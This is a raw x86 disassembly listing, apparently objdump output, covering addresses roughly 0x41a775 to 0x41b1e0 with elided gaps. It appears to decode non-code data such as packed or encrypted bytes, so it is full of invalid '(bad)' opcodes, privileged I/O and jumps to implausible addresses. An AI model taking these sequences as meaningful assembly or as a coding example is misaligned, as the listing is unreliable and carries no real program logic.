  41a775:	fdivr  DWORD PTR [esi+edi*8-0x2b301f7f]
  41a77c:	adc    DWORD PTR [eax-0x6c3f2aff],eax
  41a782:	mov    ebx,0xf0957876
  41a787:	fsub   DWORD PTR [eax-0x22]
  41a78a:	mov    gs,WORD PTR [ecx+0x6fc0adc6]
  41a790:	enter  0x7204,0x6f
  41a794:	repz into 
  41a796:	pop    ss
  41a797:	push   ebp
  41a798:	enter  0x2f42,0x2e
  41a79c:	les    ecx,FWORD PTR [edx+0x3b952f01]
  41a7a2:	popa   
  41a7a3:	mov    gs,WORD PTR [eax+ecx*1-0x25]
  41a7a7:	(bad)  
  41a7a8:	fs lock jnp 0x41a7db
  41a7ac:	int    0x3
  41a7ae:	pop    esp
  41a7af:	mov    ch,0xca
  41a7b1:	jne    0x41a75e
  41a7b3:	mov    esp,0xbfcd512e
  41a7b8:	cmp    BYTE PTR [esi-0x323161d9],bl
  41a7be:	loope  0x41a7bd
  41a7c0:	int3   
	...
  41a831:	add    BYTE PTR [eax],al
  41a833:	add    BYTE PTR [edx-0x201eb8e7],al
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a82f
  41a841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a842:	retf   
  41a843:	in     eax,dx
  41a844:	clc    
  41a845:	push   ds
  41a846:	add    DWORD PTR [eax],eax
  41a848:	cmc    
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR [edi+0x3d],dl
  41a84e:	dec    ebx
  41a84f:	stc    
  41a850:	adc    al,0xa5
  41a852:	pop    eax
  41a853:	jns    0x41a8c5
  41a855:	sub    edi,edx
  41a857:	cwde   
  41a858:	ins    BYTE PTR es:[edi],dx
  41a859:	or     DWORD PTR [esi],0x8082e216
  41a85f:	inc    esp
  41a860:	and    edi,DWORD PTR [edx]
  41a862:	jno    0x41a8c9
  41a864:	xchg   BYTE PTR [ebp+0x30],dl
  41a867:	imul   esi,ebx,0x10
  41a86a:	and    bh,ch
  41a86c:	aas    
  41a86d:	repnz pop ebx
  41a86f:	mov    esi,0xcc1e087e
  41a874:	add    eax,0xdf658447
  41a879:	jae    0x41a867
  41a87b:	paddusw mm6,QWORD PTR [ecx-0x584e747b]
  41a882:	fcomp  QWORD PTR [esi]
  41a884:	lods   eax,DWORD PTR ds:[esi]
  41a885:	mov    al,ds:0x95a05c01
  41a88a:	sub    dh,BYTE PTR [edi+0x290681d1]
  41a890:	cmp    DWORD PTR [ebp+0x62],0xffffffee
  41a894:	inc    ecx
  41a895:	imul   ebp,DWORD PTR [eax-0x1331cddf],0x5aec1076
  41a89f:	iret   
  41a8a0:	jnp    0x41a866
  41a8a2:	pushf  
  41a8a3:	dec    esi
  41a8a4:	mov    ds:0xee94dd7a,eax
  41a8a9:	inc    ecx
  41a8aa:	lods   al,BYTE PTR ds:[esi]
  41a8ab:	cdq    
  41a8ac:	(bad)  
  41a8ad:	popf   
  41a8ae:	int3   
  41a8af:	sbb    BYTE PTR [edi+0x4],dl
  41a8b2:	adc    al,0xff
  41a8b4:	in     eax,dx
  41a8b5:	mov    BYTE PTR es:[ebx-0x20b7df5f],ch
  41a8bc:	mov    cl,0xed
  41a8be:	test   BYTE PTR [ecx+edi*1-0x2b],ch
  41a8c2:	test   eax,0xeefc9cb9
  41a8c7:	pushf  
  41a8c8:	stos   DWORD PTR es:[edi],eax
  41a8c9:	outs   dx,BYTE PTR ds:[esi]
  41a8ca:	mov    edi,0x865e802c
  41a8cf:	fndisi(8087 only) 
  41a8d1:	push   ecx
  41a8d2:	pop    edi
  41a8d3:	out    0xfd,eax
  41a8d5:	push   eax
  41a8d6:	mov    ecx,0x5c2ea54
  41a8db:	retf   0x99b8
  41a8de:	push   esi
  41a8df:	sahf   
  41a8e0:	add    ebp,DWORD PTR [edi]
  41a8e2:	repz dec ecx
  41a8e4:	mov    fs,WORD PTR [esi]
  41a8e6:	dec    esi
  41a8e7:	pop    esi
  41a8e8:	and    edi,DWORD PTR [eax-0x4f]
  41a8eb:	ret    0xc070
  41a8ee:	mov    ebp,DWORD PTR [ecx-0x7f]
  41a8f1:	test   al,0xae
  41a8f3:	fs in  eax,0x14
  41a8f6:	lods   eax,DWORD PTR ds:[esi]
  41a8f7:	rcr    DWORD PTR [eax],1
  41a8f9:	jb     0x41a94e
  41a8fb:	mov    BYTE PTR [ecx-0x666b1c6a],dh
  41a901:	(bad)  
  41a902:	pop    ds
  41a903:	enter  0x3805,0x4b
  41a907:	cwde   
  41a908:	pop    esp
  41a909:	rcl    DWORD PTR [esi-0x6d2c3ec4],cl
  41a90f:	sbb    eax,0xd96209c4
  41a914:	mov    ch,0x66
  41a916:	scas   eax,DWORD PTR es:[edi]
  41a917:	or     al,0x70
  41a919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a91a:	mov    dl,0x8a
  41a91c:	xchg   esi,eax
  41a91d:	adc    dh,BYTE PTR [ebp-0xd]
  41a920:	mov    edi,0xe133534d
  41a925:	imul   ecx,DWORD PTR es:[eax],0xfffffff9
  41a929:	lock mov bl,0x61
  41a92c:	xor    BYTE PTR [ecx],cl
  41a92e:	or     DWORD PTR [ebx-0x52],edx
  41a931:	mov    bl,0x68
  41a933:	cmp    BYTE PTR [ecx],0xe8
  41a936:	add    DWORD PTR [esi],0xc8e5f274
  41a93c:	mov    cl,BYTE PTR [esi-0x26]
  41a93f:	or     eax,0xc8
	...
  41a9b4:	xor    esi,DWORD PTR [ecx]
  41a9b6:	xchg   ebx,eax
  41a9b7:	lds    edx,FWORD PTR [ebx-0x46088819]
  41a9bd:	icebp  
  41a9be:	cmp    eax,0xd824529e
  41a9c3:	add    ch,ch
  41a9c5:	pop    ds
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	cmc    
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    al,dh
  41a9cd:	add    bh,dl
  41a9cf:	jb     0x41a9be
  41a9d1:	out    0x80,al
  41a9d3:	adc    DWORD PTR [ebx-0x14edcf30],esp
  41a9d9:	and    eax,0x5ba789d2
  41a9de:	call   0x4045605a
  41a9e3:	shl    DWORD PTR [ebp+esi*8-0x19],1
  41a9e7:	xchg   edi,eax
  41a9e8:	mov    ecx,0x3d73a11b
  41a9ed:	adc    BYTE PTR [edi],bh
  41a9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9f0:	mov    dl,0x98
  41a9f2:	fcom   DWORD PTR [edx]
  41a9f4:	jno    0x41a9ad
  41a9f6:	inc    esp
  41a9f7:	hlt    
  41a9f8:	mov    bl,0x5d
  41a9fa:	xchg   BYTE PTR [edx-0x5c08db26],ah
  41aa00:	push   edx
  41aa01:	or     eax,0x71d83760
  41aa06:	jno    0x41aa5e
  41aa08:	jg     0x41aa55
  41aa0a:	push   ds
  41aa0b:	mov    dl,al
  41aa0d:	mov    esi,0x507fe5c6
  41aa12:	scas   al,BYTE PTR es:[edi]
  41aa13:	test   eax,0x97000d3d
  41aa18:	js     0x41aa80
  41aa1a:	shl    dl,0x28
  41aa1d:	shr    esp,cl
  41aa1f:	push   ebp
  41aa20:	and    ebp,DWORD PTR [edi-0x268b8906]
  41aa26:	repz pop edi
  41aa28:	and    ebx,DWORD PTR [edx+0x51]
  41aa2b:	jg     0x41aa9c
  41aa2d:	push   ds
  41aa2e:	sahf   
  41aa2f:	mov    ebx,0x8ef551b9
  41aa34:	(bad)  
  41aa35:	div    esi
  41aa37:	add    ch,BYTE PTR [esi]
  41aa39:	inc    edx
  41aa3a:	fs xchg ecx,eax
  41aa3c:	mov    esi,0x6eb62b7b
  41aa41:	test   edx,ecx
  41aa43:	mov    es,WORD PTR [ecx]
  41aa45:	fnstcw WORD PTR [ebx-0x111e48a5]
  41aa4b:	test   cl,0x10
  41aa4e:	push   eax
  41aa4f:	add    esi,DWORD PTR [edx-0x6d]
  41aa52:	xchg   edi,eax
  41aa53:	mov    ah,0x9
  41aa55:	push   esp
  41aa56:	lahf   
  41aa57:	dec    eax
  41aa58:	cwde   
  41aa59:	jbe    0x41aa2a
  41aa5b:	dec    ebp
  41aa5c:	daa    
  41aa5d:	add    DWORD PTR [edx],0x23a861ac
  41aa63:	lahf   
  41aa64:	lahf   
  41aa65:	pop    esi
  41aa66:	jecxz  0x41aaac
  41aa68:	or     DWORD PTR ds:0x6f1d31f3,ebp
  41aa6e:	cmp    al,0x5d
  41aa70:	dec    esp
  41aa71:	xchg   esi,eax
  41aa72:	xor    dl,ah
  41aa74:	sub    BYTE PTR [edi+0x7e03e845],0xc9
  41aa7b:	sahf   
  41aa7c:	out    0xa2,al
  41aa7e:	pop    ebp
  41aa7f:	int3   
  41aa80:	cmp    bh,BYTE PTR [ecx-0x24]
  41aa83:	test   ecx,esi
  41aa85:	jbe    0x41aabe
  41aa87:	xchg   esp,eax
  41aa88:	sbb    dl,BYTE PTR [ebx+0x43]
  41aa8b:	dec    edi
  41aa8c:	sub    DWORD PTR [edx-0x2b],ebp
  41aa8f:	aas    
  41aa90:	push   0xec722ca9
  41aa95:	test   BYTE PTR [esp+esi*4+0x11935d85],al
  41aa9c:	jne    0x41aabb
  41aa9e:	jno    0x41ab1e
  41aaa0:	add    BYTE PTR [ecx],0x25
  41aaa3:	dec    esi
  41aaa4:	icebp  
  41aaa5:	jg     0x41ab17
  41aaa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaa8:	pushf  
  41aaa9:	inc    esp
  41aaaa:	test   eax,0x7bc8c50c
  41aaaf:	sbb    eax,0xfe5a54de
  41aab4:	jns    0x41aad3
  41aab6:	out    dx,al
  41aab7:	pop    esi
  41aab8:	mov    ebp,0xc722e08
  41aabd:	push   ss
  41aabe:	div    BYTE PTR [esi-0x7d]
	...
  41ab31:	add    BYTE PTR [eax],al
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x6c]
  41ab41:	lahf   
  41ab42:	fwait
  41ab43:	pop    ebp
  41ab44:	loop   0x41ab66
  41ab46:	add    DWORD PTR [eax],eax
  41ab48:	cmc    
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    BYTE PTR [esi-0x3156f0eb],bh
  41ab51:	jg     0x41ab84
  41ab53:	pop    edx
  41ab54:	int3   
  41ab55:	push   es
  41ab56:	fcmovnu st,st(0)
  41ab58:	fidivr WORD PTR [ebx+0x14d20f05]
  41ab5e:	mov    al,0xaa
  41ab60:	mov    DWORD PTR [ecx],edx
  41ab62:	mov    BYTE PTR [esi+0x57],ch
  41ab65:	xchg   ebx,eax
  41ab66:	retf   0x6b2a
  41ab69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab6a:	ds mov esi,0x9f949edd
  41ab70:	xchg   ebp,eax
  41ab71:	aaa    
  41ab72:	sub    al,0x89
  41ab74:	popf   
  41ab75:	in     al,dx
  41ab76:	out    0xd6,eax
  41ab78:	lods   eax,DWORD PTR ds:[esi]
  41ab79:	mov    esi,0x7feb6f36
  41ab7e:	arpl   WORD PTR [edi+0x53],ax
  41ab81:	push   cs
  41ab82:	ins    BYTE PTR es:[edi],dx
  41ab83:	mov    ds:0xc0a8e9a2,eax
  41ab88:	pushf  
  41ab89:	or     bh,BYTE PTR [ebp+0xd]
  41ab8c:	xlat   BYTE PTR ds:[ebx]
  41ab8d:	adc    eax,0xbb50803f
  41ab92:	cmp    bl,bh
  41ab94:	mov    al,0xfc
  41ab96:	hlt    
  41ab97:	xor    BYTE PTR [esi+0x61],bl
  41ab9a:	inc    ebx
  41ab9b:	pushf  
  41ab9c:	mov    edi,0xb937d8a9
  41aba1:	dec    ecx
  41aba2:	mov    dh,0xcc
  41aba4:	ror    DWORD PTR [esi+0x78],cl
  41aba7:	cpuid  
  41aba9:	inc    esp
  41abaa:	adc    al,0x30
  41abac:	lea    edx,[edi+0x640c585f]
  41abb2:	mov    esp,0xa56f06f2
  41abb7:	into   
  41abb8:	push   esp
  41abb9:	push   0xffffffc4
  41abbb:	add    esi,ecx
  41abbd:	jb     0x41ab95
  41abbf:	add    bh,cl
  41abc1:	loope  0x41ac38
  41abc3:	pusha  
  41abc4:	lods   eax,DWORD PTR ds:[esi]
  41abc5:	lea    esi,[si]
  41abc8:	fcomp  st(1)
  41abca:	sbb    DWORD PTR [ecx-0x59],ecx
  41abcd:	fisubr DWORD PTR [esi-0x3e]
  41abd0:	mov    eax,ds:0x93df82f9
  41abd5:	cmp    al,0x4d
  41abd7:	add    ah,BYTE PTR ds:0xf91ae10a
  41abdd:	shr    DWORD PTR [esp+edi*4-0x16bd2936],0xdc
  41abe5:	jno    0x41ac17
  41abe7:	add    bl,ch
  41abe9:	and    eax,0x8257b728
  41abee:	stc    
  41abef:	out    0x53,eax
  41abf1:	fisub  WORD PTR [ebx-0x41]
  41abf4:	pop    esi
  41abf5:	into   
  41abf6:	and    esp,DWORD PTR [ebx+0x1f5b5c2]
  41abfc:	pop    ss
  41abfd:	inc    esp
  41abfe:	je     0x41abc3
  41ac00:	lods   al,BYTE PTR ds:[esi]
  41ac01:	adc    bh,dh
  41ac03:	push   es
  41ac04:	ss mov edx,0xb3a714f4
  41ac0a:	mov    ah,0x95
  41ac0c:	fcomp  DWORD PTR [ebx+0x3b]
  41ac0f:	xchg   esi,eax
  41ac10:	pop    eax
  41ac11:	dec    edi
  41ac12:	lods   eax,DWORD PTR ds:[esi]
  41ac13:	adc    ah,BYTE PTR [esi]
  41ac15:	mov    al,ds:0x296e5bbf
  41ac1a:	fst    DWORD PTR [edx+ebp*2+0x1b52d232]
  41ac21:	jmp    0x2538a37f
  41ac26:	inc    ecx
  41ac27:	pop    ebp
  41ac28:	adc    dh,cl
  41ac2a:	fs mov ah,0x98
  41ac2d:	ret    
  41ac2e:	rol    BYTE PTR [ecx-0x71c343e0],cl
  41ac34:	add    dh,0xe8
  41ac37:	aas    
  41ac38:	test   BYTE PTR ds:0x7dfa43c4,bh
  41ac3e:	neg    DWORD PTR [eax+0x41]
	...
  41acb4:	lock xchg edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0x95ac1602
  41acc3:	(bad)  
  41acc4:	xlat   BYTE PTR ds:[ebx]
  41acc5:	and    DWORD PTR [ecx],eax
  41acc7:	add    ch,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    bl,bh
  41accd:	retf   0x9e14
  41acd0:	jnp    0x41acd8
  41acd2:	inc    ebp
  41acd3:	clc    
  41acd4:	sub    cl,BYTE PTR [edi-0x3a]
  41acd7:	fwait
  41acd8:	icebp  
  41acd9:	pusha  
  41acda:	aaa    
  41acdb:	xchg   ebp,eax
  41acdc:	in     eax,0x46
  41acde:	jnp    0x41acb7
  41ace0:	push   ebp
  41ace1:	out    dx,al
  41ace2:	lea    esp,[ebp+eax*2-0x193023bc]
  41ace9:	push   edx
  41acea:	fsubp  st(4),st
  41acec:	adc    ebx,ecx
  41acee:	(bad)  
  41acf1:	(bad)  
  41acf2:	push   cs
  41acf3:	mov    edi,0xc0b6614e
  41acf8:	dec    esi
  41acf9:	cld    
  41acfa:	mov    eax,ds:0x7c97ac33
  41acff:	ds idiv dl
  41ad02:	inc    eax
  41ad03:	push   0x1e681f64
  41ad08:	xchg   ax,ax
  41ad0a:	and    eax,0x3f1d4e2d
  41ad0f:	jp     0x41ad4d
  41ad11:	xchg   esi,eax
  41ad12:	and    al,0xf0
  41ad14:	and    bl,bl
  41ad16:	pop    ss
  41ad17:	adc    ecx,DWORD PTR [eax+0x1640993e]
  41ad1d:	ret    
  41ad1e:	shr    BYTE PTR [edx-0x6388ca8c],1
  41ad24:	cmc    
  41ad25:	mov    al,ds:0x617a8884
  41ad2a:	push   esi
  41ad2b:	fiadd  DWORD PTR [eax-0x52196e38]
  41ad31:	jl     0x41acb8
  41ad33:	ja     0x41ad8e
  41ad35:	cmp    BYTE PTR [ecx+ebx*1-0x317b12e8],al
  41ad3c:	test   al,0x95
  41ad3e:	mov    cl,0x3b
  41ad40:	jle    0x41ad76
  41ad42:	jnp    0x41acf6
  41ad44:	mov    bl,0xf4
  41ad46:	jo     0x41ad65
  41ad48:	fbstp  TBYTE PTR [eax+0x52]
  41ad4b:	iret   
  41ad4c:	xchg   ecx,eax
  41ad4d:	sub    eax,0x4dbab68c
  41ad52:	cmp    cl,BYTE PTR [eax+0x38]
  41ad55:	jle    0x41ad24
  41ad57:	jecxz  0x41add6
  41ad59:	test   cl,bh
  41ad5b:	jge    0x41ad13
  41ad5d:	push   0xeb3dabe2
  41ad62:	int3   
  41ad63:	in     al,0x28
  41ad65:	lock dec esp
  41ad67:	mov    ah,0xb6
  41ad69:	stc    
  41ad6a:	inc    esp
  41ad6b:	mov    eax,ds:0x6285673a
  41ad70:	mov    ah,0xef
  41ad72:	mov    edx,0xa5839087
  41ad77:	jl     0x41ad3f
  41ad79:	xor    ebx,esp
  41ad7b:	and    edx,ecx
  41ad7d:	aas    
  41ad7e:	jo     0x41add3
  41ad80:	xchg   edi,eax
  41ad81:	cmp    BYTE PTR ds:0x2ac6724,0x5d
  41ad88:	pop    ebx
  41ad89:	pop    eax
  41ad8a:	jg     0x41ad9a
  41ad8c:	mov    es,WORD PTR [edx+0x64]
  41ad8f:	(bad)  
  41ad91:	loope  0x41ad86
  41ad93:	pop    ss
  41ad94:	xlat   BYTE PTR ds:[ebx]
  41ad95:	xor    eax,0xdefc6976
  41ad9a:	jnp    0x41adc5
  41ad9c:	pop    ebx
  41ad9d:	jle    0x41ad38
  41ad9f:	mov    cl,0xd6
  41ada1:	aaa    
  41ada2:	pop    edx
  41ada3:	cmp    BYTE PTR [ebp-0x45],dl
  41ada6:	mov    bl,BYTE PTR [eax+0x5ec8158]
  41adac:	inc    eax
  41adad:	scas   eax,DWORD PTR es:[edi]
  41adae:	bound  edx,QWORD PTR [esi-0x3a]
  41adb1:	inc    DWORD PTR [eax+0x24]
  41adb4:	pop    ds
  41adb5:	test   eax,0x48fe8441
  41adba:	pop    ss
  41adbb:	ins    BYTE PTR es:[edi],dx
  41adbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adbd:	ret    0xd3b3
  41adc0:	adc    eax,DWORD PTR [eax]
	...
  41ae32:	add    BYTE PTR [eax],al
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0x7677741d]
  41ae41:	(bad)  
  41ae42:	adc    al,0xe9
  41ae44:	int3   
  41ae45:	and    al,BYTE PTR [ecx]
  41ae47:	add    ch,dh
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    BYTE PTR [esi-0x389e0c78],bl
  41ae51:	in     al,dx
  41ae52:	jmp    0x48f4b680
  41ae57:	mov    ah,0xb3
  41ae59:	pusha  
  41ae5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae5b:	mov    edx,0x63c12a83
  41ae60:	nop
  41ae61:	pusha  
  41ae62:	aad    0x3b
  41ae64:	mov    bh,0x90
  41ae66:	xchg   esi,eax
  41ae67:	mov    al,BYTE PTR [esi]
  41ae69:	sbb    dh,ah
  41ae6b:	pop    edi
  41ae6c:	sbb    eax,0xc27114e1
  41ae71:	loop   0x41ae00
  41ae73:	(bad)  
  41ae74:	aam    0xf7
  41ae76:	sbb    BYTE PTR [edi-0x2f],cl
  41ae79:	mov    bh,0xf3
  41ae7b:	pop    edi
  41ae7c:	inc    esp
  41ae7d:	adc    eax,0xc1d8056e
  41ae82:	dec    ebp
  41ae83:	aam    0xed
  41ae85:	ds stos DWORD PTR es:[edi],eax
  41ae87:	dec    ebx
  41ae88:	jle    0x41ae9f
  41ae8a:	push   esp
  41ae8b:	inc    ebp
  41ae8c:	jge    0x41aeae
  41ae8e:	jns    0x41af01
  41ae90:	or     DWORD PTR [edi+0x36],edx
  41ae93:	xchg   ebp,eax
  41ae94:	xchg   ecx,eax
  41ae95:	lock xor esi,DWORD PTR [edx-0x74c0cada]
  41ae9c:	shl    DWORD PTR [ebp-0x5a764b],1
  41aea2:	cli    
  41aea3:	xor    dh,bl
  41aea5:	inc    ebx
  41aea6:	aad    0x1
  41aea8:	ret    0xe0fa
  41aeab:	push   cs
  41aeac:	rep ins BYTE PTR es:[edi],dx
  41aeae:	add    eax,0x3e35cb3b
  41aeb3:	cdq    
  41aeb4:	xor    eax,0x4d605b
  41aeb9:	outs   dx,DWORD PTR ds:[esi]
  41aeba:	sbb    dh,BYTE PTR [esi]
  41aebc:	xor    ch,BYTE PTR [edx+ebx*1-0x41bef328]
  41aec3:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec5:	clc    
  41aec6:	mov    WORD PTR [ecx],?
  41aec8:	push   esp
  41aec9:	stc    
  41aeca:	mov    ecx,0x9538b80b
  41aecf:	adc    eax,0x26523af
  41aed4:	cwde   
  41aed5:	mov    fs,WORD PTR [ecx]
  41aed7:	lds    edx,FWORD PTR [eax-0x633e7e43]
  41aedd:	mov    DWORD PTR [esi-0x129a97fb],edx
  41aee3:	das    
  41aee4:	jg     0x41aeac
  41aee6:	loope  0x41af3b
  41aee8:	pusha  
  41aee9:	pop    ecx
  41aeea:	mov    esp,0x965bd763
  41aeef:	test   DWORD PTR [ecx],esi
  41aef1:	int    0x77
  41aef3:	dec    ecx
  41aef4:	push   0x8
  41aef6:	cmp    dh,BYTE PTR [edx+eiz*1+0x7f01a685]
  41aefd:	fbld   TBYTE PTR [edx-0x431f23cd]
  41af03:	mov    eax,0xb994df1e
  41af08:	fwait
  41af09:	push   ecx
  41af0a:	mov    esp,0x69148d96
  41af0f:	or     ebx,DWORD PTR [eax+esi*4-0x9]
  41af13:	jbe    0x41af32
  41af15:	retf   0x44d7
  41af18:	inc    esp
  41af19:	aaa    
  41af1a:	adc    ebx,DWORD PTR [edi+ebp*8]
  41af1d:	int3   
  41af1e:	jle    0x41aed8
  41af20:	ins    DWORD PTR es:[edi],dx
  41af21:	and    BYTE PTR [eax+0x238c76fe],ch
  41af27:	inc    ebp
  41af28:	add    al,0xca
  41af2a:	ja     0x41aedb
  41af2c:	sub    eax,0x299e317f
  41af31:	and    eax,0x706dbd19
  41af36:	sbb    eax,0xd59119d1
  41af3b:	xchg   esp,eax
  41af3c:	mov    ebx,0xb8c4aa15
	...
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x8c
  41afc1:	xor    esi,DWORD PTR [eax]
  41afc3:	or     cl,al
  41afc5:	and    eax,DWORD PTR [ecx]
  41afc7:	add    ch,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [edi+0x14],cl
  41afce:	add    BYTE PTR [eax],ah
  41afd0:	pop    edx
  41afd1:	push   ebx
  41afd2:	gs gs das 
  41afd5:	push   0x63ad9fc
  41afda:	xchg   BYTE PTR [ebx+0x625b56f2],ah
  41afe0:	sbb    BYTE PTR [ebp+0x6c8f414c],0xb5
  41afe7:	pop    ecx
  41afe8:	pop    esp
  41afe9:	pop    eax
  41afea:	inc    ecx
  41afeb:	out    dx,eax
  41afec:	jo     0x41afed
  41afee:	and    eax,0xbe839440
  41aff3:	ficom  WORD PTR [esi]
  41aff5:	push   esp
  41aff6:	sub    dh,0x84
  41aff9:	jae    0x41b050
  41affb:	xchg   edx,edx
  41affd:	lahf   
  41affe:	cmp    BYTE PTR [eax],cl
  41b000:	lock shl cl,1
  41b003:	daa    
  41b004:	adc    al,0x60
  41b006:	mov    bp,0xaed0
  41b00a:	and    ebx,esp
  41b00c:	sbb    DWORD PTR [ebp-0x77b251a1],eax
  41b012:	and    DWORD PTR [ebx-0x127fc1c],esi
  41b018:	int    0xe5
  41b01a:	and    DWORD PTR [esi],ebx
  41b01c:	in     al,dx
  41b01d:	pop    edi
  41b01e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b01f:	fiadd  WORD PTR ds:[ebx+0x33ebb462]
  41b026:	lock sbb eax,DWORD PTR [esp+ecx*2-0x14de62fc]
  41b02e:	ret    0x5282
  41b031:	arpl   WORD PTR [edx+0xa],dx
  41b034:	pop    esp
  41b035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b036:	mov    ebp,0x5145e6ae
  41b03b:	sub    ch,ah
  41b03d:	ins    DWORD PTR es:[edi],dx
  41b03e:	mov    eax,ds:0xdd892d5c
  41b043:	lahf   
  41b044:	(bad)  
  41b045:	mov    ebp,0x58e93324
  41b04a:	inc    esp
  41b04b:	mov    eax,ds:0xbd4178bf
  41b050:	lahf   
  41b051:	sahf   
  41b052:	(bad)  
  41b053:	cmp    BYTE PTR [eax],bh
  41b055:	daa    
  41b056:	rcl    bl,1
  41b058:	test   BYTE PTR [eax+0x42dac6bf],al
  41b05e:	(bad)  
  41b05f:	jb     0x41afed
  41b061:	or     BYTE PTR [eax],al
  41b063:	and    esi,DWORD PTR [edi]
  41b065:	out    0xfc,eax
  41b067:	xor    al,0x8a
  41b069:	cmc    
  41b06a:	fistp  WORD PTR fs:[ecx-0x7fec3d33]
  41b071:	(bad)  
  41b072:	cdq    
  41b073:	es add eax,ebp
  41b076:	mov    ch,0x4a
  41b078:	jnp    0x41b012
  41b07a:	call   0x4ef03d6b
  41b07f:	outs   dx,DWORD PTR ds:[esi]
  41b080:	enter  0xd98c,0x7b
  41b084:	xor    eax,DWORD PTR [ecx+0x46c7ac44]
  41b08a:	enter  0x4e2f,0xf2
  41b08e:	arpl   WORD PTR [edx-0x54044331],si
  41b094:	lds    edi,FWORD PTR [ebx+0x15dfb067]
  41b09a:	mov    cl,0x4d
  41b09c:	shl    ah,0xee
  41b09f:	or     edx,DWORD PTR [esi+0x1cfd4971]
  41b0a5:	adc    eax,0xc822b44
  41b0aa:	(bad)  
  41b0ab:	in     eax,dx
  41b0ac:	test   eax,0xae34ee65
  41b0b1:	cmp    esi,0x28
  41b0b4:	xor    ebp,DWORD PTR [edx]
  41b0b6:	jno    0x41b0ca
  41b0b8:	ret    0x5615
  41b0bb:	stos   DWORD PTR es:[edi],eax
  41b0bc:	pop    eax
  41b0bd:	(bad)  
  41b0be:	stos   BYTE PTR es:[edi],al
  41b0bf:	into   
  41b0c0:	inc    ecx
	...
  41b131:	add    BYTE PTR [eax],al
  41b133:	add    BYTE PTR [esp+ecx*1],bl
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	shl    BYTE PTR es:[edi+0x124b6af],cl
  41b147:	add    ch,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    bl,cl
  41b14d:	cdq    
  41b14e:	int3   
  41b14f:	bound  esp,QWORD PTR [ebx+0xc15e738]
  41b155:	rcr    BYTE PTR [eax-0x186dae21],0x93
  41b15c:	jl     0x41b157
  41b15e:	pop    es
  41b15f:	retf   
  41b160:	dec    ebx
  41b161:	sahf   
  41b162:	cwde   
  41b163:	jb     0x41b1c0
  41b165:	pop    ss
  41b166:	xchg   ecx,eax
  41b167:	aad    0x24
  41b169:	fwait
  41b16a:	add    eax,0xd73bfcc4
  41b16f:	adc    eax,0xd51ff3bd
  41b174:	xchg   esp,eax
  41b175:	in     al,dx
  41b176:	fst    QWORD PTR [ecx]
  41b178:	(bad)  
  41b179:	jle    0x41b1a9
  41b17b:	xor    al,0x9e
  41b17d:	pop    ds
  41b17e:	jp     0x41b153
  41b180:	gs shr edi,0x8b
  41b184:	push   ecx
  41b185:	jne    0x41b134
  41b187:	aaa    
  41b188:	inc    ecx
  41b189:	out    dx,eax
  41b18a:	dec    edi
  41b18b:	dec    esi
  41b18c:	inc    edi
  41b18d:	repnz (bad) 
  41b18f:	repnz or eax,0x3e82d1a5
  41b195:	(bad)  [edi]
  41b197:	or     edi,DWORD PTR ds:0x54e74e4a
  41b19d:	out    0x3c,al
  41b19f:	pusha  
  41b1a0:	adc    BYTE PTR [ebx+0x38],ch
  41b1a3:	js     0x41b19a
  41b1a5:	fs stos BYTE PTR es:[edi],al
  41b1a7:	push   ds
  41b1a8:	dec    edx
  41b1a9:	cmp    eax,0x407a7001
  41b1ae:	sub    eax,0x976012ce
  41b1b3:	cli    
  41b1b4:	loope  0x41b197
  41b1b6:	stos   BYTE PTR es:[edi],al
  41b1b7:	fwait
  41b1b8:	and    al,0xca
  41b1ba:	icebp  
  41b1bb:	(bad)  
  41b1bc:	addr16 xchg edx,eax
  41b1be:	int3   
  41b1bf:	mov    dh,dl
  41b1c1:	push   edi
  41b1c2:	int3   
  41b1c3:	out    dx,eax
  41b1c4:	jbe    0x41b1a5
  41b1c6:	cmc    
  41b1c7:	inc    esp
  41b1c8:	adc    DWORD PTR [edx+0x30f88b00],ebp
  41b1ce:	pop    edx
  41b1cf:	mov    ?,WORD PTR [edx+0x477f7978]
  41b1d5:	(bad)  
  41b1d6:	push   cs
  41b1d7:	nop
  41b1d8:	or     dl,BYTE PTR [ebx+0x345adcf3]
  41b1de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1df:	push   ds
  41b1e0:	lods   eax,DWORD PTR ds:[esi]
